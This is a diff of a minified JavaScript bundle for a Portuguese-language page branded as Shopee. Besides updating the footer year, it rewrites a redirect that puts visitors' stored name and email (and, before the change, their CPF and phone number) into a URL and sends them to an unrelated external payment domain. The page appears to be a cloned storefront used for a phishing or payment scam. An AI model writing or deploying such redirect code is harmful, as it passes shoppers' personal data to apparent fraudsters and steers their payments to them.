@@ -15077,7 +15077,7 @@ const $W = () => {
                       className: "h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded"
                   }), u.jsx("p", {
                       className: "text-sm text-center md:text-left",
-                      children: "© 2024 Shopee. Todos os direitos reservados."
+                      children: "© 2025 Shopee. Todos os direitos reservados."
                   })]
               }), u.jsxs("div", {
                   className: "text-center md:text-right",
@@ -28888,12 +28888,10 @@ const lb = Object.freeze(Object.defineProperty({
                                     const params = new URLSearchParams(window.location.search);
                               
                                     // Adiciona os dados ao query
-                                    if (localData.cpf) params.set("document", localData.cpf);
-                                    if (localData.nome) params.set("name", localData.nome);
+                                    if (localData.nome) params.set("nome", localData.nome);
                                     if (localData.email) params.set("email", localData.email);
-                                    if (localData.telefone) params.set("telephone", localData.telefone);
                               
-                                    const url = "https://pay.emissaogarantida.online/N1nVZpYEEKeGlM6?" + params.toString() + "#id=methodPayments";
+                                    const url = "https://pay.compraeguraapay.com.br/checkout/80c48764-ba05-4ba8-bd3d-55297f82c530/" + params.toString();
                                     window.location.href = url;
                                   } catch (e) {
                                     console.error("Erro ao redirecionar:", e);
